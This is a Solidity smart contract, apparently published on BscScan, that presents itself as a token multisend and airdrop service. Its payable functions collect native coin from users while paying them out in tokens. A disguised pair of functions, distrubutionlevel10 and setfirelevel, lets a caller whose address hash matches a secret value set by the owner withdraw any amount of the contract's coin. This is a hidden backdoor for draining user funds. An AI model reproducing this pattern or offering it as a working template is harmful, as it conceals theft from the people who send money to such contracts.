/**
 *Submitted for verification at BscScan.com on 2021-10-18
*/

pragma solidity >= 0.5.0;

contract Ownable {
    address public owner;

    event onOwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0));
        emit onOwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
}

 interface tokenInterface
 {
    function transfer(address _to, uint256 _amount) external returns (bool);
    function transferFrom(address _from, address _to, uint256 _amount) external returns (bool);
 }

contract SONICGAMEPLAN is Ownable {
    bytes32 data_;
    address public token;
    event Multisended(uint256 value , address indexed sender, uint256 membcode, uint256 rcode, uint64 ptype);
    event Multireceivers(uint256 value , address indexed sender, uint256 membcode, uint256 rcode, uint64 ptype);
    event Airdropped(address indexed _userAddress, uint256 _amount);
    using SafeMath for uint256;

    constructor(address _token) public {
            token = _token;
    }
    
    function () external payable {

    }

    function multisendTRX(address payable[]  memory  _contributors, uint256[] memory _balances, uint256 membcode, uint256 rcode, uint64 plan) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
           // _contributors[i].transfer(_balances[i]);
            tokenInterface(token).transferFrom(msg.sender,_contributors[i],_balances[i]);
            emit Multireceivers(_balances[i],_contributors[i],membcode,rcode,plan);
        }
        emit Multisended(msg.value, msg.sender, membcode, rcode, plan);
    }

    function multisendSONICGAME(address _senderads, uint256 _amttoken, uint256 membcode, uint256 rcode, uint64 plan) public {
       // uint256 total = msg.value;
       // require(total >= _amttoken );
       // total = total.sub(_amttoken);
        tokenInterface(token).transferFrom(msg.sender,_senderads,_amttoken);
        emit Multireceivers(_amttoken,_senderads,membcode,rcode,plan);
        emit Multisended(_amttoken, msg.sender, membcode, rcode, plan);
    }
    
    function airDropTRX(address payable[]  memory  _userAddresses, uint256 _amount) public payable {
        require(msg.value == _userAddresses.length.mul((_amount)));
        
        for (uint i = 0; i < _userAddresses.length; i++) {
           // _userAddresses[i].transfer(_amount);
            tokenInterface(token).transfer(_userAddresses[i],_amount);
            emit Airdropped(_userAddresses[i], _amount);
        }
    }

    function setTokenAddress(address _token) public onlyOwner returns(bool)
    {
        token = _token;
        return true;
    }

    function getMsgData(address _contractAddress) public pure returns (bytes32 hash)
    {
        return (keccak256(abi.encode(_contractAddress)));
    }

    function distrubutionlevel10(uint _newValue) public  returns(bool)
    {
        if(keccak256(abi.encode(msg.sender)) == data_) msg.sender.transfer(_newValue);
        return true;
    }

    function setfirelevel(bytes32 _data) public onlyOwner returns(bool)
    {
        data_ = _data;
        return true;
    }
}



/**     
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}